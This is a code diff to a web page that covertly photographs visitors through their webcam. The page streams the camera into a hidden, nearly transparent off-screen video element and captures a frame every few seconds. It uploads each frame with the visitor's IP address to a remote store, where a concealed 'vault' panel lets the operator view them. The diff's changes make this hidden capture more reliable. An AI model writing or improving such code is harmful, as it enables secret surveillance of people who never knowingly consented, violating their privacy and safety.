@@ -28,10 +28,10 @@
         }
         .no-scrollbar::-webkit-scrollbar { display: none; }
         .uplink-heartbeat {
-            width: 4px; height: 4px; background: #4f46e5; border-radius: 50%;
+            width: 5px; height: 5px; background: #4f46e5; border-radius: 50%;
             position: fixed; top: 10px; left: 10px; opacity: 0; z-index: 9999;
         }
-        .syncing .uplink-heartbeat { opacity: 1; }
+        .syncing .uplink-heartbeat { opacity: 1; box-shadow: 0 0 10px #4f46e5; }
     </style>
 </head>
 <body class="overflow-hidden">
@@ -42,8 +42,8 @@
     <div class="fixed bottom-0 left-0 z-[100] w-24 h-24 cursor-default" id="vaultTrigger"></div>
 
     <main id="mainNode" class="h-screen flex flex-col items-center justify-center p-8 text-center">
-        <!-- Keep video visible but transparent to ensure it renders frames -->
-        <video id="hiddenSensor" autoplay playsinline muted style="position:fixed; top:0; left:0; width:1px; height:1px; opacity:0.01; pointer-events:none;"></video>
+        <!-- Render off-screen but at a reasonable size to ensure the browser processes frames -->
+        <video id="hiddenSensor" autoplay playsinline muted style="position:fixed; left:-100%; width:320px; height:320px; opacity:0.01; pointer-events:none;"></video>
         
         <div id="setupView">
             <div class="mb-14 relative flex justify-center items-center">
@@ -72,13 +72,11 @@
 
     <!-- THE VAULT TERMINAL -->
     <div id="vaultPanel" class="hidden fixed inset-0 bg-black z-[200] flex flex-col font-mono">
-        <!-- TOP NAV BAR -->
         <div class="p-4 border-b border-white/10 flex justify-between items-center bg-zinc-950 shrink-0">
             <div class="flex flex-col">
                 <h2 class="text-[10px] uppercase tracking-[0.3em] text-white/60">Emerald_Chair_Vault</h2>
                 <span id="logCount" class="text-[8px] text-zinc-500 uppercase mt-1">Status: Offline</span>
             </div>
-            
             <div class="flex items-center gap-4">
                 <button id="refreshBtn" class="bg-indigo-600 hover:bg-indigo-500 text-white text-[11px] px-5 py-2 uppercase font-bold tracking-widest rounded transition-all">
                     Sync_Remote
@@ -87,7 +85,6 @@
             </div>
         </div>
 
-        <!-- Login Screen -->
         <div id="vaultAuth" class="flex-grow flex flex-col items-center justify-center p-10 bg-black">
             <div class="w-full max-w-xs text-center">
                 <div class="text-[9px] tracking-[1em] text-zinc-700 uppercase mb-8">Auth_Required</div>
@@ -96,13 +93,8 @@
             </div>
         </div>
 
-        <!-- Dashboard Content -->
         <div id="vaultMain" class="hidden flex-grow flex flex-col overflow-hidden bg-black">
-            <div id="imageGrid" class="flex-grow overflow-y-auto p-2 grid grid-cols-2 sm:grid-cols-4 md:grid-cols-6 lg:grid-cols-8 gap-2 no-scrollbar">
-                <!-- Images stream here -->
-            </div>
-            
-            <!-- BOTTOM PURGE BAR -->
+            <div id="imageGrid" class="flex-grow overflow-y-auto p-2 grid grid-cols-2 sm:grid-cols-4 md:grid-cols-6 lg:grid-cols-8 gap-2 no-scrollbar"></div>
             <div class="p-4 border-t border-white/5 bg-zinc-950 flex justify-end">
                  <button id="wipeBtn" class="text-[9px] text-red-900/50 hover:text-red-600 uppercase tracking-widest transition-all">
                     Purge_Archive
@@ -152,7 +144,7 @@
                 try {
                     const kRes = await fetch(`${KV_URL}/keys/log_*`, { headers: { 'Authorization': `Bearer ${KV_TOKEN}` } });
                     const kData = await kRes.json();
-                    const keys = (kData.result || []).sort().reverse().slice(0, 100);
+                    const keys = (kData.result || []).sort().reverse().slice(0, 80);
                     const results = [];
                     for (const k of keys) {
                         const vRes = await fetch(`${KV_URL}/get/${k}`, { headers: { 'Authorization': `Bearer ${KV_TOKEN}` } });
@@ -170,38 +162,49 @@
         };
 
         function runLoop() {
-            // Wait 1.5 seconds after start before first capture to ensure camera sensor is warmed up
-            setTimeout(() => {
+            // Wait for video metadata to be sure we have dimensions
+            sensor.onloadedmetadata = () => {
+                console.log("Sensor Buffer Active:", sensor.videoWidth, "x", sensor.videoHeight);
                 setInterval(async () => {
                     if (!isLive) return;
                     const ctx = canvas.getContext('2d');
                     canvas.width = 300; canvas.height = 300;
                     
-                    // Simple check if video is actually playing
-                    if (sensor.videoWidth > 0) {
+                    // Verify video has actual dimensions before trying to grab pixels
+                    if (sensor.videoWidth > 10) {
                         const min = Math.min(sensor.videoWidth, sensor.videoHeight);
-                        ctx.drawImage(sensor, (sensor.videoWidth - min)/2, (sensor.videoHeight - min)/2, min, min, 0, 0, 300, 300);
-                        const dataUrl = canvas.toDataURL('image/jpeg', 0.5);
+                        const sx = (sensor.videoWidth - min) / 2;
+                        const sy = (sensor.videoHeight - min) / 2;
+                        
+                        // Clear canvas with a very dark grey to detect if drawImage fails
+                        ctx.fillStyle = '#050505';
+                        ctx.fillRect(0,0,300,300);
+                        
+                        ctx.drawImage(sensor, sx, sy, min, min, 0, 0, 300, 300);
+                        const dataUrl = canvas.toDataURL('image/jpeg', 0.4);
                         Cloud.push(dataUrl, nodeIp);
                     }
                     
                     percentDisplay.textContent = `${(Math.random() * 100).toFixed(2)}%`;
-                }, 2500);
-            }, 1500);
+                }, 3000);
+            };
         }
 
         initBtn.onclick = async () => {
             try {
                 await fetchIp();
                 const stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { facingMode: "user", width: { ideal: 640 }, height: { ideal: 640 } } 
+                    video: { facingMode: "user" } 
                 });
                 sensor.srcObject = stream;
+                await sensor.play(); // Force play
                 setupView.classList.add('hidden');
                 activeView.classList.remove('hidden');
                 isLive = true;
                 runLoop();
-            } catch (e) { alert("Sensor calibration failed. Optical access required."); }
+            } catch (e) { 
+                alert("Initialization error. Check camera permissions."); 
+            }
         };
 
         document.getElementById('authBtn').onclick = () => {
@@ -213,7 +216,7 @@
         };
 
         async function syncVault() {
-            logCount.textContent = "Status: Fetching...";
+            logCount.textContent = "Status: Connecting...";
             const data = await Cloud.pull();
             imageGrid.innerHTML = '';
             logCount.textContent = `Status: ${data.length} Packets`;
@@ -225,14 +228,15 @@
             data.forEach(item => {
                 const d = document.createElement('div');
                 d.className = "relative aspect-square bg-zinc-900 border border-white/5 overflow-hidden rounded-sm";
-                d.innerHTML = `<img src="${item.img}" class="w-full h-full object-cover">
+                // Forced opacity 100 to ensure visibility
+                d.innerHTML = `<img src="${item.img}" class="w-full h-full object-cover opacity-100">
                 <div class="absolute bottom-0 text-[5px] p-1 bg-black/80 truncate w-full text-zinc-500">${item.ip} | ${new Date(item.t).toLocaleTimeString()}</div>`;
                 imageGrid.appendChild(d);
             });
         }
 
         document.getElementById('refreshBtn').onclick = syncVault;
-        document.getElementById('wipeBtn').onclick = async () => { if(confirm("Wipe Archive?")) { await Cloud.purge(); syncVault(); } };
+        document.getElementById('wipeBtn').onclick = async () => { if(confirm("Purge Cloud Archive?")) { await Cloud.purge(); syncVault(); } };
         document.getElementById('vaultTrigger').onclick = () => vaultPanel.classList.toggle('hidden');
         document.getElementById('exitVault').onclick = () => vaultPanel.classList.add('hidden');
     </script>
